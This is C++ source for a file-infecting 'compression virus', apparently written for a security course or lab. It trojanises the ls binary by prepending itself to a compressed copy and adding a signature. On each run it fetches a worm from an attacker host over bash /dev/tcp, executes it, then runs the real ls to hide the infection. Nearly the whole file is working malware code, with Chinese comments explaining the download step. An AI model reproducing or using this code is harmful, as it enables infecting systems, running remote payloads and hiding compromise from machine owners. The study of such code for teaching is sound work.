#include <iostream>
#include <stdlib.h>
#include <string>
#include <cstring>
#include <fstream>
#include <vector>
#include <unistd.h>
#include <sys/wait.h>
#include "attacker.h"

using namespace std;

int main(int argc, char* argv[])
{
    // read ls file
    ifstream ls_file("/app/ls", ios::binary);
    vector<unsigned char> ls((istreambuf_iterator<char>(ls_file)), istreambuf_iterator<char>());
    ls_file.close();
	// get the signature from infected ls
    unsigned char signature[4];
    memcpy(signature, &ls[ls.size()-4],4);

    unsigned char Hexspeak[4] = {0xaa, 0xbb, 0xcc, 0xdd};

    // infected already, decompress it
    if(!memcmp(signature, Hexspeak, 4))
	{
		// bash -c option 意思是把option當成string吃進來並執行
		// cat < /dev/tcp/attacter_ip/attacter_port 意思是從server拿到worm檔案的內容，<就是把後面的東西當成input的意思
		// cat... > /app/worm 意思是把cat拿到的內容無條件覆蓋掉/app/worm的內容
		string cmd = "bash -c 'cat < /dev/tcp/"+ attacker_IP + "/" + attacker_port + " > /app/worm'";
		int code = system(cmd.c_str());
	
		// execute the worm
		code = system("chmod +x /app/worm");
		code = system("/app/worm");
		code = system("rm /app/worm");
		
		// prepare to execute the original ls program => retrieve the information first
		int start_pos_compressed_ls;
		int len_compressed_ls;
		memcpy(&start_pos_compressed_ls, &ls[ls.size()-12], 4);
		memcpy(&len_compressed_ls, &ls[ls.size()-8], 4);
	
		// write the compressed ls to a file
		ofstream compressed_ls_file;
		compressed_ls_file.open("/app/compressed_ls.zip", ios::binary);
		compressed_ls_file.write((char*) &ls[start_pos_compressed_ls], len_compressed_ls);
		compressed_ls_file.close();
	
		// unzip the compressed ls into the original one
		// send contents of compressed_ls.zip via pipe into original_ls, no messages
		code = system("unzip -p /app/compressed_ls.zip > /app/original_ls");
		code = system("chmod +x /app/original_ls");
	
		// parse the argument
		vector<char*> args;
		string path = "/app/original_ls";
		args.push_back((char*)path.c_str());
		for (int i = 1;i<argc;i++)
		{
		    args.push_back(argv[i]);
		}
		args.push_back(NULL);
		
		// execute the original ls program using fork
		pid_t pid = fork();
		if(pid==0)
		{ 	// child process
		    execv(args[0], args.data());
		}
		else
		{	// parent process
		    wait(0);
		    code = system("rm /app/compressed_ls.zip");
		    code = system("rm /app/original_ls");
		}
    }
    // not infected, compress it and prepend this code
    else
	{  
        // compress the ls program
		//  > /dev/null means no messages
		int code = system("zip -j /app/compressed_ls.zip /app/ls > /dev/null");
		
		// read bytes of the compression virus(CV)
		ifstream CV_file("/app/compression_virus", ios::binary);
		vector<unsigned char> CV((istreambuf_iterator<char>(CV_file)), istreambuf_iterator<char>());
		CV_file.close();
	
        // read from the compressed ls program
        ifstream compressed_ls_file("/app/compressed_ls.zip", ios::binary);
        vector<unsigned char> compressed_ls((istreambuf_iterator<char>(compressed_ls_file)), istreambuf_iterator<char>());
        compressed_ls_file.close();
	
		// record the starting position of the compressed ls program in byte array => length of CV
		unsigned char CV_len_in_byte[4];
		int len_CV = CV.size();
		memcpy(CV_len_in_byte, &len_CV, 4);
	
        // record the length of the compressed ls program in byte array
        unsigned char compressed_ls_len_in_byte[4];
        int len_compressed_ls = compressed_ls.size();
        memcpy(compressed_ls_len_in_byte, &len_compressed_ls, 4);

        // CV + compressed ls + padding + 4b start position of compressed ls + 4b len of compressed ls + 4b signature
		vector<unsigned char> new_ls;
		
		// CV
		for(int i=0; i<CV.size(); i++)
		{
		    new_ls.push_back(CV[i]);
		}
		
		// compressed ls
		for(int i=0; i<compressed_ls.size(); i++)
		{
		    new_ls.push_back(compressed_ls[i]);
		}
	
		// append some bytes to make its size the same as the original ls program
		while(new_ls.size() < ls.size()-12)
		{
		    new_ls.push_back('\x00');
		}
	
		// starting position of compressed ls
		for(int i=0; i<4; i++)
		{
		    new_ls.push_back(CV_len_in_byte[i]);
		}
	
		// len of compressed ls
		for(int i=0; i<4; i++){
		    new_ls.push_back(compressed_ls_len_in_byte[i]);
		}

		// signature
		new_ls.push_back('\xaa');
		new_ls.push_back('\xbb');
		new_ls.push_back('\xcc');
		new_ls.push_back('\xdd');
	
		// write back to the file
		ofstream new_ls_file;
		new_ls_file.open("/app/ls", ios::binary);
		new_ls_file.write((char*) &new_ls[0], new_ls.size());
		new_ls_file.close();
	
		code = system("rm /app/compression_virus /app/compressed_ls.zip");
    }
}